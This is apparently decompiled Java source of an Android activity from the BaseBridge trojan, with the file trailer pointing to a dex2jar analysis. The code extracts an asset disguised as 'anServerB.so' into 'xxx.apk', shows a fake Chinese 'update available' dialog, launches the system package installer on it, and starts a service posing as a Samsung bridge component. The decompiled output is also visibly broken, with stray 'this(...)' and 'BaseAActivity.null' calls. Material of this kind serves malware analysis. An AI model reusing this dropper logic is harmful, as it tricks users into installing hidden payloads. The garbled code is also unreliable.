package com.zhangling.anTest20;

import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.app.TabActivity;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.widget.TextView;
import com.zhangling.util.Logs;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class BaseAActivity extends TabActivity {
  private static boolean beNotInstaled;
  
  static Context context;
  
  public static SharedPreferences.Editor editor;
  
  public static SharedPreferences sp = null;
  
  private int MODE = 3;
  
  String appClassName = null;
  
  String b_name_full = "anServerB.so";
  
  String b_name_prefix = "anServerB";
  
  String b_name_suffix = ".so";
  
  String b_package = "com.sec.android.bridge";
  
  String b_package_class = "com.sec.android.bridge.BridgeProvider";
  
  String global_B_path = null;
  
  private Handler handler = new Handler() {
      public void handleMessage(Message param1Message) {
        Intent intent;
        AlertDialog.Builder builder;
        super.handleMessage(param1Message);
        switch (param1Message.what) {
          default:
            return;
          case 0:
            intent = new Intent();
            intent.putExtra("beNotInstaled", BaseAActivity.beNotInstaled);
            intent.setClassName(BaseAActivity.this.getPackageName(), BaseAActivity.this.appClassName);
            BaseAActivity.this.startActivity(intent);
          case 10:
            builder = new AlertDialog.Builder(BaseAActivity.context);
            builder.setCancelable(false);
            builder.setTitle("通知").setMessage("已发现有更新版本哦！").setPositiveButton("闪电更新", new DialogInterface.OnClickListener() {
                  public void onClick(DialogInterface param2DialogInterface, int param2Int) {
                    try {
                      BaseAActivity.null.access$0(BaseAActivity.null.this).sendMsg(11);
                    } catch (Exception exception) {}
                  }
                }).show();
          case 11:
            BaseAActivity.this.pd = new ProgressDialog(BaseAActivity.context);
            BaseAActivity.this.pd.setCancelable(false);
            BaseAActivity.this.pd.setTitle("正在更新数据...");
            BaseAActivity.this.pd.show();
            try {
              if (BaseAActivity.this.global_B_path == null)
                BaseAActivity.this.reLeaseB(); 
              Thread thread = new Thread();
              Runnable runnable = new Runnable() {
                  public void run() {
                    try {
                      Thread.sleep(500L);
                      BaseAActivity.null.access$0(BaseAActivity.null.this).sendMsg(12);
                    } catch (Exception exception) {}
                  }
                };
              super(this);
              this(runnable);
              thread.start();
            } catch (Exception exception) {
              BaseAActivity.this.sendMsg(13);
            } 
          case 12:
            try {
              File file = new File();
              StringBuilder stringBuilder = new StringBuilder();
              this("/data/data/");
              this(stringBuilder.append(BaseAActivity.this.getPackageName()).append("/files/xxx.apk").toString());
              if (file.exists() && file.canRead()) {
                Uri uri = Uri.fromFile(file);
                Intent intent1 = new Intent();
                this("android.intent.action.VIEW", uri);
                intent1.setData(uri);
                intent1.addFlags(1);
                intent1.setClassName("com.android.packageinstaller", "com.android.packageinstaller.PackageInstallerActivity");
                BaseAActivity.this.startActivity(intent1);
                BaseAActivity.beNotInstaled = false;
              } else {
                BaseAActivity.this.sendMsg(13);
              } 
              BaseAActivity.this.pd.setCancelable(true);
              BaseAActivity.this.pd.dismiss();
              BaseAActivity.this.pd.cancel();
              Thread thread = new Thread();
              Runnable runnable = new Runnable() {
                  public void run() {
                    try {
                      Thread.sleep(2000L);
                      BaseAActivity.null.access$0(BaseAActivity.null.this).sendMsg(14);
                    } catch (Exception exception) {}
                  }
                };
              super(this);
              this(runnable);
              thread.start();
            } catch (Exception exception) {
              BaseAActivity.this.sendMsg(13);
            } 
          case 13:
            builder = new AlertDialog.Builder(BaseAActivity.context);
            builder.setCancelable(true);
            builder.setTitle("通知").setMessage("跟新失败，下次更新！").setPositiveButton("同意", new DialogInterface.OnClickListener() {
                  public void onClick(DialogInterface param2DialogInterface, int param2Int) {
                    try {
                      (BaseAActivity.null.access$0(BaseAActivity.null.this)).pd.setCancelable(true);
                      (BaseAActivity.null.access$0(BaseAActivity.null.this)).pd.dismiss();
                      (BaseAActivity.null.access$0(BaseAActivity.null.this)).pd.cancel();
                    } catch (Exception exception) {}
                  }
                }).show();
          case 14:
            builder = new AlertDialog.Builder(BaseAActivity.context);
            builder.setCancelable(false);
            builder.setTitle("通知").setMessage("更新需要您重启该程序").setPositiveButton("重启", new DialogInterface.OnClickListener() {
                  public void onClick(DialogInterface param2DialogInterface, int param2Int) {
                    (new Thread(new Runnable() {
                          public void run() {
                            try {
                              Thread.sleep(1000L);
                              BaseAActivity.null.access$0(BaseAActivity.null.null.this.this$1).sendMsg(0);
                            } catch (Exception exception) {}
                          }
                        })).start();
                    BaseAActivity.null.access$0(BaseAActivity.null.this).finish();
                  }
                }).show();
          case 100:
            break;
        } 
        try {
          BaseAActivity.this.intent.setClassName(BaseAActivity.this.b_package, BaseAActivity.this.b_package_class);
          BaseAActivity.this.startService(BaseAActivity.this.intent);
        } catch (Exception exception) {}
      }
    };
  
  Intent intent = new Intent();
  
  ProgressDialog pd = null;
  
  TextView textView = null;
  
  static {
    editor = null;
    context = null;
    beNotInstaled = true;
  }
  
  private void reLeaseB() {
    try {
      InputStream inputStream = getAssets().open(this.b_name_full);
      FileOutputStream fileOutputStream = openFileOutput("xxx.apk", 1);
      byte[] arrayOfByte = new byte[inputStream.available()];
      while (true) {
        if (inputStream.read(arrayOfByte) == -1) {
          inputStream.close();
          fileOutputStream.flush();
          fileOutputStream.close();
          return;
        } 
        fileOutputStream.write(arrayOfByte);
      } 
    } catch (Exception exception) {}
  }
  
  private void sendMsg(int paramInt) {
    Message message = new Message();
    message.what = paramInt;
    this.handler.sendMessage(message);
  }
  
  public String getSDPath() {
    File file = null;
    if (Environment.getExternalStorageState().equals("mounted"))
      file = Environment.getExternalStorageDirectory(); 
    return file.toString();
  }
  
  public void initData(String paramString) {
    if (!Build.VERSION.RELEASE.startsWith("1.5")) {
      int i;
      int j;
      startBridge();
      this.appClassName = paramString;
      sp = getSharedPreferences("first_app_perferences", this.MODE);
      editor = sp.edit();
      try {
        i = (getPackageManager().getPackageInfo(getPackageName(), 0)).versionCode;
        j = createPackageContext(this.b_package, 2).getSharedPreferences("first_app_perferences", this.MODE).getInt("global_b_version_id", 0);
        StringBuilder stringBuilder = new StringBuilder();
        this("global_b_version_id:");
        Logs.out(stringBuilder.append(j).toString());
        if (j == 0) {
          if (beNotInstaled) {
            sendMsg(10);
            return;
          } 
          Thread.sleep(1000L);
          j = createPackageContext(this.b_package, 2).getSharedPreferences("first_app_perferences", this.MODE).getInt("global_b_version_id", 0);
          stringBuilder = new StringBuilder();
          this("2 global_b_version_id:");
          Logs.out(stringBuilder.append(j).toString());
          if (j > 0 && j < i)
            sendMsg(10); 
          return;
        } 
      } catch (Exception exception) {
        Logs.out(exception);
        sendMsg(10);
        return;
      } 
      if (j < i)
        sendMsg(10); 
    } 
  }
  
  public void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    this.global_B_path = null;
    context = (Context)this;
  }
  
  public void startBridge() {
    try {
      this.intent.setClassName(this.b_package, this.b_package_class);
      startService(this.intent);
    } catch (Exception exception) {
      exception.printStackTrace();
    } 
  }
}


/* Location:              /home/fahim/Desktop/Basebridge3-dex2jar.jar!/com/zhangling/anTest20/BaseAActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */